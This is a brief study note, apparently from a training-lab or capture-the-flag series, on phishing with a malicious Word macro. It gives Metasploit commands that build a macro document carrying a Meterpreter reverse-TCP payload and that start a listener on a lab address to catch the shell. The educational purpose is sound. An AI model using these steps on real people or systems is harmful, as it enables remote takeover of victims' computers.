---
title: Day 10 - He had a brain full of macros, and had shells in his soul.
draft: false
tags:
  - cybersecurity
  - phishing
---


Human hacking is usually the easiest to accomplish

### Macros
An automated solution to save time and reduce manual effort.
Set of programmed instructions

### Attack plan

1. Create a document with a malicious macro
2. Start listening for incoming connections on the attacker's system
3. Email the document and wait for the target user to open it
4. Target user opens the document and connects the the attacker's system
5. Control the target user's system


### Creating a Malicious Document

- Open terminal and run `msfconsole`
- `set payload windows/meterpreter/reverse_tcp`
- `use exploit/multi/fileformat/office_word_macro`
- `set LHOST 10.10.211.101` listener host
- `set LPORT 8888` listener port
- `show options` check before running
- `exploit` executes 
- `exit` to return terminal

The most important part of the macro is the AutoOpen() method


### Listening for Incoming Connections

- Open `msfconsole`
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set LHOST 10.10.211.101`
- `set LPORT 8888`
- `show options`
- `exploit`